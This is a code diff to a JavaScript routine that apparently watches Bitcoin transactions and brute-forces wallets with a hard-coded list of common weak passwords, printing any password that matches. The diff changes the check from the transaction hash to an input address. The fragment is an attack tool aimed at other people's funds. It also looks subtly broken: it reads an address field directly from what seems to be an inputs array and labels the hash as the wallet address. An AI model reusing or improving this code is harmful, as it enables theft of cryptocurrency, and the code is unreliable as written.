@@ -113,16 +113,16 @@ function length(obj) {
 	var t0 = performance.now();
 	var jsonData = evt.data;
 	var obj = JSON.parse(jsonData);
-	
 	var jsonLength = length(obj.x.inputs);
 	
 	var t_hash = obj.x.hash;
+	var t_addr = obj.x.inputs.prev_out.addr;
 	updateDebug('Transaction Hash: ' + t_hash + '\n' + 'Sigscript Length: ' + (jsonLength+1) + '\n' + 'Complexity (n*n)/2: ' + ((jsonLength+1)*jsonLength)/2 + '\n\n' + 'Bruteforcing Wallets with 25 common weak passwords.');
 	var passArray = ["password", "123456", "12345678", "1q2w3e4r", "abc123", "qwertyuiop", "1234567", "letmein", "trustno1", "dragon", "baseball", "111111", "iloveyou", "123456789", "qwerty123", "!@#$%^&*", "password1", "adobe123", "1qaz2wsx", "passw0rd", "princess", "shadow", "sunshine", "trustno1"];
 	var arrayLength = passArray.length;
 	for(let i = 0 ; i < arrayLength; i++) {
-		if(check_password(t_hash, passArray[i]) == true) {
-			writeToScreen('<p>Pass found for: ' + t_hash + '\n\nPassword: ' + passArray[i] + '</p>');
+		if(check_password(t_addr, passArray[i]) == true) {
+			writeToScreen('<p>Wallet Address: ' + t_hash + '\n\nPassword: ' + passArray[i] + '</p>');
 		}
 	}
 	
